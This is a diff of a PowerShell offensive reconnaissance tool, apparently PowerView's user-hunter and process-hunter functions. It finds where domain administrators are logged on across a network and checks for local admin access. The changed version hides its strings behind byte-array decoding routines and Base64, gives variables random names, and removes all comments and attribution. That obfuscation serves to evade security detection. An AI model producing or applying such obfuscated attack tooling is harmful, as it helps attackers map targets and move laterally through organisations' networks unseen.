+                        Write-Verbose ((ParseEntry20 @(72,236,193,248,204,89,211,128,198,221,85,160,208,203,176,113,220,246,206,243,125,194,247,236,231,118,212,140) @(31,149,177,156,133)) + $Domain + (ParseEntry20 @(250,255,229,72,83,128,136,115,225,212,242,89,101,219,156,79,215,213,233,71,83,144,254,67,255,223,130,3) @(179,184,191,62,48,233,202,54)))
                         $ComputerName += Get-DFSshare -Domain $Domain -DomainController $DomainController | ForEach-Object {$_.RemoteServerName}
                     }
-                    if (($StealthSource -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM=")))) -or ($StealthSource -eq (HandleResult95 @(3,206,211,112) @(82,153,171,3)))) {
-                        Write-Verbose ((HandleResult95 @(15,181,67,225,115,23,30,253,105,221,112,100,57,155,6,235,115,22,10,186,81,210,124,33,58,165,114,184) @(88,204,51,133,58,81)) + $Domain + (HandleResult95 @(94,31,19,78,199,126,26,12,90,150,38,48,40,111,144,112,9,123,1,209,115,16,3,78,198,80,32,37,91,202,90,45,5,81,144,42) @(23,88,73,56,164)))
+                    if (($StealthSource -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM=")))) -or ($StealthSource -eq (ParseEntry20 @(34,164,252,105) @(115,243,132,26,198,28,218)))) {
+                        Write-Verbose ((ParseEntry20 @(20,255,31,161,239,175,120,114,220,55,143,147,136,105,118,232,38,130,244,159,92,20,192,31,167,207,168,3) @(67,134,111,197,166,233,62)) + $Domain + (ParseEntry20 @(92,50,225,167,118,28,249,148,119,71,138,185,116,34,143,182,68,71,130,164,113,61,241,167,119,50,195,189,118,27,246,164,89,28,143,236) @(21,117,187,209)))
                         $ComputerName += Get-NetDomainController -LDAP -Domain $Domain -DomainController $DomainController | ForEach-Object { $_.dnshostname}
                     }
                 }
             }
             else {
-                ForEach ($Domain in $ajPzEg) {
-                    Write-Verbose ((HandleResult95 @(29,150,186,158,199,167,205,37,16,183,128,207,239,182,190,122,3,168,152,140,236,182,205,100,40,134,139,199) @(74,239,202,250,142,225,139,20)) + $Domain + (HandleResult95 @(139,43,212,167,78,48,183,224,160,95,192,225,78,46,200,178) @(194,108,142,209,45,89,245,143)))
-
-                    $GM6i = @{
+                ForEach ($Domain in $k8fkcV) {
+                    Write-Verbose ((ParseEntry20 @(153,109,141,106,66,136,82,204,84,83,132,33,156,89,62,160,93,186,92,125,172,67,187,126,105,167,85,192) @(206,20,253,14,11)) + $Domain + (ParseEntry20 @(75,191,40,152,97,145,48,129,96,203,60,222,97,143,79,211) @(2,248,114,238)))
+                    $Z5nzf = @{
                         'Domain' = $Domain
                         'DomainController' = $DomainController
                         'ADSpath' = $ADSpath
                         'Filter' = $ComputerFilter
                         'Unconstrained' = $Unconstrained
                     }
-
-                    $ComputerName += Get-NetComputer @GM6i
+                    $ComputerName += Get-NetComputer @Z5nzf
                 }
             }
-
-            # remove any null target hosts, uniquify the list and shuffle it
             $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
             if($($ComputerName.Count) -eq 0) {
-                throw (HandleResult95 @(181,122,74,24,128,80,75,5,133,95,63,24,187,122,75,78,131,122,35,23) @(225,23,114,127))
+                throw (ParseEntry20 @(124,175,104,207,201,137,17,184,52,224,229,169,114,175,105,153,202,163,121,170) @(40,194,80,168,168,206))
             }
         }
-
-        #####################################################
-        #
-        # Now we build the user target set
-        #
-        #####################################################
-
-        # users we're going to be searching for
         $TargetUsers = @()
-
-        # get the current user so we can ignore it in the results
         $CurrentUser = ([Environment]::UserName).toLower()
-
-        # if we're showing all results, skip username enumeration
         if($ShowAll -or $ForeignUsers) {
-            $m342PSR = New-Object PSObject
-            $m342PSR | Add-Member Noteproperty 'MemberDomain' $Null
-            $m342PSR | Add-Member Noteproperty 'MemberName' '*'
-            $TargetUsers = @($m342PSR)
-
+            $qzuM = New-Object PSObject
+            $qzuM | Add-Member Noteproperty 'MemberDomain' $Null
+            $qzuM | Add-Member Noteproperty 'MemberName' '*'
+            $TargetUsers = @($qzuM)
             if($ForeignUsers) {
-                # if we're searching for user results not in the primary domain
-                $xtIMUZXg = Convert-CanonicaltoNT4 -ObjectName ((HandleResult95 @(169,217,77,78,172,11,120,213,153,171,58,26) @(200,234,7,39,200,76,28,229)) + $($Domain))
-                $DomainShortName = $xtIMUZXg.split("\")[0]
+                $IVlpSJDA = Convert-CanonicaltoNT4 -ObjectName ((ParseEntry20 @(216,133,205,147,221,241,227,202,232,247,186,199) @(185,182,135,250)) + $($Domain))
+                $DomainShortName = $IVlpSJDA.split("\")[0]
             }
         }
-        # if we want to hunt for the effective domain users who can access a target server
         elseif($TargetServer) {
-            Write-Verbose ((HandleResult95 @(158,56,127,105,16,165,12,89,103,30,168,7,77,66,53,178,58,27,83,67,130,40,103,105,16,165,58,69,102,26,138,14) @(203,96,41,5,115)) + $TargetServer + (HandleResult95 @(183,25,60,209,242,53,180,7,28,251,169,108,164,55,9,219,244,94,179,12,29,210,221,59) @(253,96,126,188,144,6)))
+            Write-Verbose ((ParseEntry20 @(229,253,194,76,238,95,220,213,246,77,238,86,212,226,210,89,215,3,230,149,221,104,195,93,211,203,206,76,238,88,241,203) @(176,165,148,32,141,49)) + $TargetServer + (ParseEntry20 @(204,240,56,103,228,186,51,109,228,206,67,96,223,222,13,109,226,209,52,102,229,231,55,55) @(134,137,122,10)))
             $TargetUsers = Get-NetLocalGroup $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
-                $m342PSR = New-Object PSObject
-                $m342PSR | Add-Member Noteproperty 'MemberDomain' ($_.AccountName).split("/")[0].toLower() 
-                $m342PSR | Add-Member Noteproperty 'MemberName' ($_.AccountName).split("/")[1].toLower() 
-                $m342PSR
+                $qzuM = New-Object PSObject
+                $qzuM | Add-Member Noteproperty 'MemberDomain' ($_.AccountName).split("/")[0].toLower() 
+                $qzuM | Add-Member Noteproperty 'MemberName' ($_.AccountName).split("/")[1].toLower() 
+                $qzuM
             }  | Where-Object {$_}
         }
-        # if we get a specific username, only use that
         elseif($UserName) {
-            Write-Verbose ((HandleResult95 @(125,172,99,148,142,223,124,175,114,167,242,247,99,157,65,152,164,244,78,185,119,179,133,168,73,231,69,137,142,218,73,232) @(42,213,19,240,199,153)) + $UserName + (HandleResult95 @(116,0,122,153,26,5,51,206) @(62,121,78,236,86,98,14,243)))
-            $m342PSR = New-Object PSObject
-            $m342PSR | Add-Member Noteproperty 'MemberDomain' $ajPzEg[0]
-            $m342PSR | Add-Member Noteproperty 'MemberName' $UserName.ToLower()
-            $TargetUsers = @($m342PSR)
+            Write-Verbose ((ParseEntry20 @(102,69,205,77,21,22,229,75,93,234,28,50,25,251,99,84,222,68,56,60,215,114,126,140,74,110,6,202,120,127,222,20) @(49,60,189,41,92,80,179)) + $UserName + (ParseEntry20 @(193,35,9,130,187,236,103,0) @(139,90,61,247,247)))
+            $qzuM = New-Object PSObject
+            $qzuM | Add-Member Noteproperty 'MemberDomain' $k8fkcV[0]
+            $qzuM | Add-Member Noteproperty 'MemberName' $UserName.ToLower()
+            $TargetUsers = @($qzuM)
         }
-        # read in a target user list if we have one
         elseif($UserFile) {
             $TargetUsers = Get-Content -Path $UserFile | ForEach-Object {
-                $m342PSR = New-Object PSObject
-                $m342PSR | Add-Member Noteproperty 'MemberDomain' $ajPzEg[0]
-                $m342PSR | Add-Member Noteproperty 'MemberName' $_
-                $m342PSR
+                $qzuM = New-Object PSObject
+                $qzuM | Add-Member Noteproperty 'MemberDomain' $k8fkcV[0]
+                $qzuM | Add-Member Noteproperty 'MemberName' $_
+                $qzuM
             }  | Where-Object {$_}
         }
         elseif($UserADSpath -or $UserFilter -or $AdminCount) {
-            ForEach ($Domain in $ajPzEg) {
-
-                $GM6i = @{
+            ForEach ($Domain in $k8fkcV) {
+                $Z5nzf = @{
                     'Domain' = $Domain
                     'DomainController' = $DomainController
                     'ADSpath' = $UserADSpath
@@ -8096,116 +4012,92 @@ function Invoke-UserHunter {
                     'AdminCount' = $AdminCount
                     'AllowDelegation' = $AllowDelegation
                 }
-
-                Write-Verbose ((HandleResult95 @(66,188,203,110,92,131,253,59,79,157,241,63,116,146,142,100,92,130,233,124,119,146,253,122,119,172,250,55) @(21,197,187,10)) + $Domain + (HandleResult95 @(4,79,175,14,20,36,74,196,27,69,27,113,150,15,74,112) @(77,8,245,120,119)))
-                $TargetUsers += Get-NetUser @GM6i | ForEach-Object {
-                    $m342PSR = New-Object PSObject
-                    $m342PSR | Add-Member Noteproperty 'MemberDomain' $Domain
-                    $m342PSR | Add-Member Noteproperty 'MemberName' $_.samaccountname
-                    $m342PSR
+                Write-Verbose ((ParseEntry20 @(162,224,137,66,0,105,154,196,195,161,108,124,78,139,192,247,176,97,27,89,190,162,223,137,68,32,110,225) @(245,153,249,38,73,47,220)) + $Domain + (ParseEntry20 @(157,23,51,238,55,189,18,88,251,102,130,41,10,239,105,233) @(212,80,105,152,84)))
+                $TargetUsers += Get-NetUser @Z5nzf | ForEach-Object {
+                    $qzuM = New-Object PSObject
+                    $qzuM | Add-Member Noteproperty 'MemberDomain' $Domain
+                    $qzuM | Add-Member Noteproperty 'MemberName' $_.samaccountname
+                    $qzuM
                 }  | Where-Object {$_}
-
             }            
         }
         else {
-            ForEach ($Domain in $ajPzEg) {
-                Write-Verbose ((HandleResult95 @(197,211,146,156,151,212,236,211,162,134,216,159,131,175,235,252,227,165,170,168,240,253,164,136,188,251,235,223) @(146,170,226,248,222)) + $Domain + (HandleResult95 @(42,137,56,150,122,28,92,82,173,80,182,96,22,103,33,184,56,137,91,27,125,14,247,83,131,90,52,112) @(99,206,98,224,25,117,30)) + $GroupName + "'")
+            ForEach ($Domain in $k8fkcV) {
+                Write-Verbose ((ParseEntry20 @(13,47,134,53,19,13,28,103,172,9,16,126,59,1,195,63,19,12,8,32,148,6,28,59,56,63,183,108) @(90,86,246,81,90,75)) + $Domain + (ParseEntry20 @(210,60,92,242,248,18,68,181,248,73,80,253,248,2,68,242,193,18,68,234,248,22,63,181,248,56,71,234) @(155,123,6,132)) + $GroupName + "'")
                 $TargetUsers += Get-NetGroupMember -GroupName $GroupName -Domain $Domain -DomainController $DomainController
             }
         }
-
         if (( (-not $ShowAll) -and (-not $ForeignUsers) ) -and ((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
-            throw (HandleResult95 @(212,192,100,36,24,121,182,207,107,8,7,70,217,225,104,58,24,123,217,207,70,23,100,87,202,241,112,54,24,116,205,213,123,24,27,86,226,250,96,45,51,15,202,209) @(131,185,34,64,81,60))
+            throw (ParseEntry20 @(69,32,84,97,245,238,57,100,16,90,83,198,241,84,88,35,91,66,230,221,104,69,108,121,76,244,249,122,91,17,92,105,229,243,70,120,56,81,71,209,201,63,91,49) @(18,89,18,5,188,171,12))
         }
-
-        # script block that enumerates a server
-        $h6EYtum2 = {
+        $s8TS = {
             param($ComputerName, $Ping, $TargetUsers, $CurrentUser, $Stealth, $DomainShortName)
-
-            # optionally check if the server is up first
-            $yssh = $True
+            $lPdgSYQ = $True
             if($Ping) {
-                $yssh = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
+                $lPdgSYQ = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
             }
-            if($yssh) {
+            if($lPdgSYQ) {
                 if(!$DomainShortName) {
-                    # if we're not searching for foreign users, check session information
-                    $q3Xdk = Get-NetSession -ComputerName $ComputerName
-                    ForEach ($JrxqcO0 in $q3Xdk) {
-                        $UserName = $JrxqcO0.sesi10_username
-                        $rXnmA = $JrxqcO0.sesi10_cname
-
-                        if($rXnmA -and $rXnmA.StartsWith(([char]0x5c+[char]0x5c))) {
-                            $rXnmA = $rXnmA.TrimStart("\")
+                    $Ms1RF = Get-NetSession -ComputerName $ComputerName
+                    ForEach ($BbCl in $Ms1RF) {
+                        $UserName = $BbCl.sesi10_username
+                        $fRC3aX = $BbCl.sesi10_cname
+                        if($fRC3aX -and $fRC3aX.StartsWith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))))) {
+                            $fRC3aX = $fRC3aX.TrimStart("\")
                         }
-
-                        # make sure we have a result
                         if (($UserName) -and ($UserName.trim() -ne '') -and (!($UserName -match $CurrentUser))) {
-
                             $TargetUsers | Where-Object {$UserName -like $_.MemberName} | ForEach-Object {
-
-                                $RKpbjk = Get-IPAddress -ComputerName $ComputerName
-                                $Rk5gx = New-Object PSObject
-                                $Rk5gx | Add-Member Noteproperty 'UserDomain' $_.MemberDomain
-                                $Rk5gx | Add-Member Noteproperty 'UserName' $UserName
-                                $Rk5gx | Add-Member Noteproperty 'ComputerName' $ComputerName
-                                $Rk5gx | Add-Member Noteproperty 'IP' $RKpbjk
-                                $Rk5gx | Add-Member Noteproperty 'SessionFrom' $rXnmA
-
-                                # see if we're checking to see if we have local admin access on this machine
+                                $KqK0q2 = Get-IPAddress -ComputerName $ComputerName
+                                $LWCSUOjd = New-Object PSObject
+                                $LWCSUOjd | Add-Member Noteproperty 'UserDomain' $_.MemberDomain
+                                $LWCSUOjd | Add-Member Noteproperty 'UserName' $UserName
+                                $LWCSUOjd | Add-Member Noteproperty 'ComputerName' $ComputerName
+                                $LWCSUOjd | Add-Member Noteproperty 'IP' $KqK0q2
+                                $LWCSUOjd | Add-Member Noteproperty 'SessionFrom' $fRC3aX
                                 if ($CheckAccess) {
-                                    $Wv1EyQ = Invoke-CheckLocalAdminAccess -ComputerName $rXnmA
-                                    $Rk5gx | Add-Member Noteproperty 'LocalAdmin' $Wv1EyQ
+                                    $LuvpW8 = Invoke-CheckLocalAdminAccess -ComputerName $fRC3aX
+                                    $LWCSUOjd | Add-Member Noteproperty 'LocalAdmin' $LuvpW8
                                 }
                                 else {
-                                    $Rk5gx | Add-Member Noteproperty 'LocalAdmin' $Null
+                                    $LWCSUOjd | Add-Member Noteproperty 'LocalAdmin' $Null
                                 }
-                                $Rk5gx
+                                $LWCSUOjd
                             }
                         }                                    
                     }
                 }
                 if(!$Stealth) {
-                    # if we're not 'stealthy', enumerate loggedon users as well
-                    $gxXpvI1 = Get-NetLoggedon -ComputerName $ComputerName
-                    ForEach ($m342PSR in $gxXpvI1) {
-                        $UserName = $m342PSR.wkui1_username
-                        # TODO: translate domain to authoratative name
-                        #   then match domain name ?
-                        $JrDg6EbO = $m342PSR.wkui1_logon_domain
-
-                        # make sure wet have a result
+                    $Zad6A = Get-NetLoggedon -ComputerName $ComputerName
+                    ForEach ($qzuM in $Zad6A) {
+                        $UserName = $qzuM.wkui1_username
+                        $of0NvYsD = $qzuM.wkui1_logon_domain
                         if (($UserName) -and ($UserName.trim() -ne '')) {
-
                             $TargetUsers | Where-Object {$UserName -like $_.MemberName} | ForEach-Object {
-
-                                $VmL0JD = $True
+                                $fi738H = $True
                                 if($DomainShortName) {
-                                    if ($DomainShortName.ToLower() -ne $JrDg6EbO.ToLower()) {
-                                        $VmL0JD = $True
+                                    if ($DomainShortName.ToLower() -ne $of0NvYsD.ToLower()) {
+                                        $fi738H = $True
                                     }
                                     else {
-                                        $VmL0JD = $False
+                                        $fi738H = $False
                                     }
                                 }
-                                if($VmL0JD) {
-                                    $RKpbjk = Get-IPAddress -ComputerName $ComputerName
-                                    $Rk5gx = New-Object PSObject
-                                    $Rk5gx | Add-Member Noteproperty 'UserDomain' $JrDg6EbO
-                                    $Rk5gx | Add-Member Noteproperty 'UserName' $UserName
-                                    $Rk5gx | Add-Member Noteproperty 'ComputerName' $ComputerName
-                                    $Rk5gx | Add-Member Noteproperty 'IP' $RKpbjk
-                                    $Rk5gx | Add-Member Noteproperty 'SessionFrom' $Null
-
-                                    # see if we're checking to see if we have local admin access on this machine
+                                if($fi738H) {
+                                    $KqK0q2 = Get-IPAddress -ComputerName $ComputerName
+                                    $LWCSUOjd = New-Object PSObject
+                                    $LWCSUOjd | Add-Member Noteproperty 'UserDomain' $of0NvYsD
+                                    $LWCSUOjd | Add-Member Noteproperty 'UserName' $UserName
+                                    $LWCSUOjd | Add-Member Noteproperty 'ComputerName' $ComputerName
+                                    $LWCSUOjd | Add-Member Noteproperty 'IP' $KqK0q2
+                                    $LWCSUOjd | Add-Member Noteproperty 'SessionFrom' $Null
                                     if ($CheckAccess) {
-                                        $Wv1EyQ = Invoke-CheckLocalAdminAccess -ComputerName $ComputerName
-                                        $Rk5gx | Add-Member Noteproperty 'LocalAdmin' $Wv1EyQ
+                                        $LuvpW8 = Invoke-CheckLocalAdminAccess -ComputerName $ComputerName
+                                        $LWCSUOjd | Add-Member Noteproperty 'LocalAdmin' $LuvpW8
                                     }
                                     else {
-                                        $Rk5gx | Add-Member Noteproperty 'LocalAdmin' $Null
+                                        $LWCSUOjd | Add-Member Noteproperty 'LocalAdmin' $Null
                                     }
-                                    $Rk5gx
+                                    $LWCSUOjd
                                 }
                             }
                         }
@@ -8213,59 +4105,40 @@ function Invoke-UserHunter {
                 }
             }
         }
-
     }
-
     process {
-
         if($Threads) {
-            Write-Verbose ((HandleResult95 @(119,192,89,40,3,171,206,70,252,80,48,24,156,250,103,243,118,15,84,168,228,105,252,103,60,38,161,202,69,223,127,33,59,145,235,74,251,110,25,88,143,236,28,165) @(33,152,23,88,97,198,173)) + $Threads)
-
-            # if we're using threading, kick off the script block with Invoke-ThreadedFunction
-            $O2kwi = @{
+            Write-Verbose ((ParseEntry20 @(101,49,141,202,255,150,80,14,167,253,245,130,105,62,133,209,252,172,6,7,138,242,249,139,87,46,164,221,249,188,91,16,153,237,219,144,80,16,130,131,212,186,14,84) @(51,105,195,186,157,251)) + $Threads)
+            $n3XrNi5 = @{
                 'Ping' = $(-not $NoPing)
                 'TargetUsers' = $TargetUsers
                 'CurrentUser' = $CurrentUser
                 'Stealth' = $Stealth
                 'DomainShortName' = $DomainShortName
             }
-
-            # kick off the threaded script block + arguments 
-            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $h6EYtum2 -ScriptParameters $O2kwi
+            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $s8TS -ScriptParameters $n3XrNi5
         }
-
         else {
             if(-not $NoPing -and ($ComputerName.count -ne 1)) {
-                # ping all hosts in parallel
                 $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                 $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
             }
-
-            Write-Verbose ((HandleResult95 @(237,228,135,59,128,180,150,192,222,218,177,44,128,181,241,135,216,202,189,51,170,155,134,192,224,244,181,55,144,193,150,198,222,240,162,56,168,181,253,204,222,213,186,105,128,179,249,139) @(186,157,247,95,201,242,196,182)) + $($ComputerName.count))
-            $ypmBN = 0
-
-            ForEach ($fa0ya in $ComputerName) {
-
-                $ypmBN = $ypmBN + 1
-
-                # sleep for our semi-randomized interval
-                Start-Sleep -Seconds $WLAr.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
-
-                Write-Verbose ((HandleResult95 @(214,13,30,47,49,184,215,1,10,28,73,145,226,25,40,123,25,170,180,26,39,3,54,145,226,26,52,39,27,148,192,73) @(129,116,110,75,120,253)) + $fa0ya + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICg="))) + $ypmBN + (HandleResult95 @(229,215,236,114,229,209,232,34) @(172,144,213,31)) + $($ComputerName.count) + ")")
-                $e9hz = Invoke-Command -ScriptBlock $h6EYtum2 -ArgumentList $fa0ya, $False, $TargetUsers, $CurrentUser, $Stealth, $DomainShortName
-                $e9hz
-
-                if($e9hz -and $StopOnSuccess) {
-                    Write-Verbose (HandleResult95 @(107,116,160,41,155,87,110,101,179,32,182,125,88,78,146,124,177,35,106,116,153,10,136,103,88,90,229,38,158,82,126,116,138,21,128,32,95,96,229,61,176,124,95,106,138,26,148,104,94,69,187,112) @(60,13,208,77,210,17))
+            Write-Verbose ((ParseEntry20 @(40,14,229,179,125,57,37,227,179,115,57,4,220,144,1,78,21,194,157,88,28,30,215,161,110,22,53,253,142,7,45,7,241,186,97,24,22,210,238,78,27,63,216,225,125,62,74,168) @(127,119,149,215,52)) + $($ComputerName.count))
+            $o6bG = 0
+            ForEach ($mnZ6k in $ComputerName) {
+                $o6bG = $o6bG + 1
+                Start-Sleep -Seconds $BiHWqPVB.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
+                Write-Verbose ((ParseEntry20 @(36,80,133,149,12,54,127,128,149,18,66,69,150,156,3,67,72,162,196,43,58,97,187,157,38,29,115,153,146,44,50,20) @(115,41,245,241,69)) + $mnZ6k + ([char]0x20+[char]0x28) + $o6bG + (ParseEntry20 @(148,161,5,17,152,146,183,224) @(221,230,60,124,209,211,138)) + $($ComputerName.count) + ")")
+                $NW6jRjlY = Invoke-Command -ScriptBlock $s8TS -ArgumentList $mnZ6k, $False, $TargetUsers, $CurrentUser, $Stealth, $DomainShortName
+                $NW6jRjlY
+                if($NW6jRjlY -and $StopOnSuccess) {
+                    Write-Verbose (ParseEntry20 @(213,93,42,74,204,244,115,234,71,55,74,233,214,98,192,21,57,28,211,203,104,197,126,44,74,210,135,74,206,103,24,87,223,234,115,179,71,55,27,245,208,76,225,67,0,121,195,203,67,202,79,103) @(130,36,90,46,133,178,33))
                     return
                 }
             }
         }
-
     }
 }
-
-
 function Invoke-StealthUserHunter {
     [CmdletBinding()]
     param(
@@ -8273,401 +4146,184 @@ function Invoke-StealthUserHunter {
         [Alias('Hosts')]
         [String[]]
         $ComputerName,
-
         [ValidateScript({Test-Path -Path $_ })]
         [Alias('HostList')]
         [String]
         $ComputerFile,
-
         [String]
         $ComputerFilter,
-
         [String]
         $ComputerADSpath,
-
         [String]
         $GroupName = 'Domain Admins',
-
         [String]
         $TargetServer,
-
         [String]
         $UserName,
-
         [String]
         $UserFilter,
-
         [String]
         $UserADSpath,
-
         [ValidateScript({Test-Path -Path $_ })]
         [String]
         $UserFile,
-
         [Switch]
         $CheckAccess,
-
         [Switch]
         $StopOnSuccess,
-
         [Switch]
         $NoPing,
-
         [UInt32]
         $Delay = 0,
-
         [Double]
         $Jitter = .3,
-
         [String]
         $Domain,
-
         [Switch]
         $ShowAll,
-
         [Switch]
         $SearchForest,
-
         [String]
-        [ValidateSet((HandleResult95 @(12,151,226,52) @(94,210,184,96,196)),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM="))),(HandleResult95 @(132,86,110,144,223,184,186,217) @(214,59,2,227,133,233,135,228)),(HandleResult95 @(133,145,39,95) @(212,198,95,44,149,230,29,193)))]
-        $StealthSource =(HandleResult95 @(194,161,122,252) @(147,246,2,143,34))
+        [ValidateSet((ParseEntry20 @(118,192,74,62) @(36,133,16,106,204,178,134,170)),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM="))),(ParseEntry20 @(99,78,3,36,86,74,199,157) @(49,35,111,87,12,27,250,160)),(ParseEntry20 @(129,120,194,150) @(208,47,186,229,161,29)))]
+        $StealthSource =(ParseEntry20 @(162,196,48,42) @(243,147,72,89,162,16))
     )
-    # kick off Invoke-UserHunter with stealth options
     Invoke-UserHunter -Stealth @PSBoundParameters
 }
-
-
 function Invoke-ProcessHunter {
-<#
-    .SYNOPSIS
-
-        Query the process lists of remote machines, searching for
-        processes with a specific name or owned by a specific user.
-        Thanks to @paulbrandau for the approach idea.
-        
-        Author: @harmj0y
-        License: BSD 3-Clause
-
-    .PARAMETER ComputerName
-
-        Host array to enumerate, passable on the pipeline.
-
-    .PARAMETER ComputerFile
-
-        File of hostnames/IPs to search.
-
-    .PARAMETER ComputerFilter
-
-        Host filter name to query AD for, wildcards accepted.
-
-    .PARAMETER ComputerADSpath
-
-        The LDAP source to search through for hosts, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-        Useful for OU queries.
-
-    .PARAMETER ProcessName
-
-        The name of the process to hunt, or a comma separated list of names.
-
-    .PARAMETER GroupName
-
-        Group name to query for target users.
-
-    .PARAMETER TargetServer
-
-        Hunt for users who are effective local admins on a target server.
-
-    .PARAMETER UserName
-
-        Specific username to search for.
-
-    .PARAMETER UserFilter
-
-        A customized ldap filter string to use for user enumeration, e.g. "(description=*admin*)"
-
-    .PARAMETER UserADSpath
-
-        The LDAP source to search through for users, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-        Useful for OU queries.
-
-    .PARAMETER UserFile
-
-        File of usernames to search for.
-
-    .PARAMETER RemoteUserName
-
-        The "domain\username" to use for the WMI call on a remote system.
-        If supplied, 'RemotePassword' must be supplied as well.
-
-    .PARAMETER RemotePassword
-
-        The password to use for the WMI call on a remote system.
-
-    .PARAMETER StopOnSuccess
-
-        Switch. Stop hunting after finding after finding a target user/process.
-
-    .PARAMETER NoPing
-
-        Switch. Don't ping each host to ensure it's up before enumerating.
-
-    .PARAMETER Delay
-
-        Delay between enumerating hosts, defaults to 0
-
-    .PARAMETER Jitter
-
-        Jitter for the host delay, defaults to +/- 0.3
-
-    .PARAMETER Domain
-
-        Domain for query for machines, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER ShowAll
-
-        Switch. Return all user location results.
-
-    .PARAMETER SearchForest
-
-        Switch. Search all domains in the forest for target users instead of just
-        a single domain.
-
-    .PARAMETER Threads
-
-        The maximum concurrent threads to execute.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-ProcessHunter -Domain 'testing'
-        
-        Finds machines on the 'testing' domain where domain admins have a
-        running process.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-ProcessHunter -Threads 20
-
-        Multi-threaded process hunting, replaces Invoke-ProcessHunterThreaded.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-ProcessHunter -UserFile users.txt -ComputerFile hosts.txt
-        
-        Finds machines in hosts.txt where any members of users.txt have running
-        processes.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-ProcessHunter -GroupName "Power Users" -Delay 60
-        
-        Find machines on the domain where members of the "Power Users" groups have
-        running processes with a 60 second (+/- *.3) randomized delay between
-        touching each host.
-
-    .LINK
-
-        http://blog.harmj0y.net
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(Position=0,ValueFromPipeline=$True)]
         [Alias('Hosts')]
         [String[]]
         $ComputerName,
-
         [ValidateScript({Test-Path -Path $_ })]
         [Alias('HostList')]
         [String]
         $ComputerFile,
-
         [String]
         $ComputerFilter,
-
         [String]
         $ComputerADSpath,
-
         [String]
         $ProcessName,
-
         [String]
         $GroupName = 'Domain Admins',
-
         [String]
         $TargetServer,
-
         [String]
         $UserName,
-
         [String]
         $UserFilter,
-
         [String]
         $UserADSpath,
-
         [ValidateScript({Test-Path -Path $_ })]
         [String]
         $UserFile,
-
         [String]
         $RemoteUserName,
-
         [String]
         $RemotePassword,
-
         [Switch]
         $StopOnSuccess,
-
         [Switch]
         $NoPing,
-
         [UInt32]
         $Delay = 0,
-
         [Double]
         $Jitter = .3,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [Switch]
         $ShowAll,
-
         [Switch]
         $SearchForest,
-
         [ValidateRange(1,100)] 
         [Int]
         $Threads
     )
-
     begin {
-
         if ($PSBoundParameters['Debug']) {
             $DebugPreference = 'Continue'
         }
-
-        # random object for delay
-        $WLAr = New-Object System.Random
-
-        Write-Verbose ((HandleResult95 @(250,11,93,96,222,169,231,67,79,105,162,159,207,31,78,99,196,184,152,64,79,54,227,131,225,36,111,125,245,221,227,30,78,55,217,166,201,37,24,52,205,183,228,21,73,54,251,223,204,49,111,111,205,184,213,26,72,87,213,153,247,27,108,57) @(173,114,45,4,151,239)) + $Delay)
-
+        $BiHWqPVB = New-Object System.Random
+        Write-Verbose ((ParseEntry20 @(35,143,191,111,137,130,15,69,148,162,62,176,166,40,23,145,156,92,245,246,39,70,130,163,71,150,134,60,22,196,129,103,163,247,11,61,146,152,62,240,158,29,61,145,171,57,172,244,36,55,180,164,81,151,188,45,17,165,141,125,154,173,4,73) @(116,246,207,11,192,196,69)) + $Delay)
         if($Domain) {
-            $ajPzEg = @($Domain)
+            $k8fkcV = @($Domain)
         }
         elseif($SearchForest) {
-            # get ALL the domains in the forest to search
-            $ajPzEg = Get-NetForestDomain | ForEach-Object { $_.Name }
+            $k8fkcV = Get-NetForestDomain | ForEach-Object { $_.Name }
         }
         else {
-            # use the local domain
-            $ajPzEg = @( (Get-NetDomain).name )
+            $k8fkcV = @( (Get-NetDomain).name )
         }
-
-        #####################################################
-        #
-        # First we build the host target set
-        #
-        #####################################################
-
         if(!$ComputerName) { 
-            # if we're using a host list, read the targets in and add them to the target list
             if($ComputerFile) {
                 $ComputerName = Get-Content -Path $ComputerFile
             }
             else {
                 [array]$ComputerName = @()
-                ForEach ($Domain in $ajPzEg) {
-                    Write-Verbose ((HandleResult95 @(185,110,62,162,81,191,205,223,77,22,140,45,152,220,219,121,7,129,74,143,233,185,81,62,164,113,184,182) @(238,23,78,198,24,249,139)) + $Domain + (HandleResult95 @(107,20,106,123,126,145,20,136,64,96,126,61,126,143,107,218) @(34,83,48,13,29,248,86,231)))
+                ForEach ($Domain in $k8fkcV) {
+                    Write-Verbose ((ParseEntry20 @(108,53,124,70,225,239,240,20,97,20,70,23,201,254,131,75,114,11,94,84,202,254,240,85,89,37,77,31) @(59,76,12,34,168,169,182,37)) + $Domain + (ParseEntry20 @(158,194,225,194,137,133,149,234,217,135,164,220,180,242,134,137) @(215,133,187,180,234,236)))
                     $ComputerName += Get-NetComputer -Domain $Domain -DomainController $DomainController -Filter $ComputerFilter -ADSpath $ComputerADSpath
                 }
             }
-
-            # remove any null target hosts, uniquify the list and shuffle it
